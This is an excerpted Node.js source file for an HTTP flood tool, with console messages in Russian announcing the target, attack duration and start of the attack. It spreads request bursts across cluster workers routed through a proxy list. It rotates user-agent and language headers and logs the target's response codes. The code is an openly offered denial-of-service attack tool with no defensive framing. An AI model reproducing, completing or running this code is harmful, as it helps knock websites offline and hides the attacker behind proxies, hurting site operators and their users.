...
if (process.argv.length < 7) {
    ...
    console.log(`--log — включить цветное логирование статус-кодов каждого запроса`);
    process.exit();
}
...
if (cluster.isMaster) {
    console.log(`${colors.cyan}[Master]${colors.reset} Цель: ${args.target}`);
    console.log(`${colors.cyan}[Master]${colors.reset} Прокси загружено: ${proxies.length}`);
    console.log(`${colors.cyan}[Master]${colors.reset} Потоков: ${args.threads} | Rate: ${args.Rate} req/s на поток`);
    console.log(`${colors.cyan}[Master]${colors.reset} Время атаки: ${args.time} сек`);
    console.log(`${colors.cyan}[Master]${colors.reset} Цветное логирование: ${args.log ? colors.green + "ВКЛЮЧЕНО" : colors.gray + "выключено"}${colors.reset}`);
    console.log(`${colors.cyan}[Master]${colors.reset} Атака начата!\n`);
...
const languages = ["en-US,en;q=0.9", "en-GB,en;q=0.8", "es-ES,es;q=0.9", "fr-FR,fr;q=0.9,en;q=0.8", "de-DE,de;q=0.9,en;q=0.8"];
const useragents = [
...
function getColoredStatus(status) {
    if (typeof status === "number") {
        ...
        if (status === 403 || status === 429 || status >= 500) return colors.red + status + colors.reset;
...
function runFlooder() {
    ...
    const proxyOptions = { proxy: proxyAddr, address: parsedTarget.host + ":443", timeout: 8000 };
            ...
            IntervalAttack = setInterval(() => {
                for (let i = 0; i < args.Rate; i++) {
                    ...
                    request.on("response", (respHeaders) => {
                        ...
                        if (args.log) {
                            console.log(`[PID ${process.pid}] ${proxyAddr} → ${getColoredStatus(status)} ${path}`);
                        }
                        request.close();
                        request.destroy();
                    });
                    ...
                    request.on("error", () => {
                        if (args.log) {
                            console.log(`[PID ${process.pid}] ${proxyAddr} → ${getColoredStatus("ERROR")} ${path}`);
                        }
                        request.destroy();
                    });
...
const KillScript = () => {
    console.log(`\n${colors.red}[Flooder]${colors.reset} Атака завершена по таймеру.`);
    process.exit(0);
};
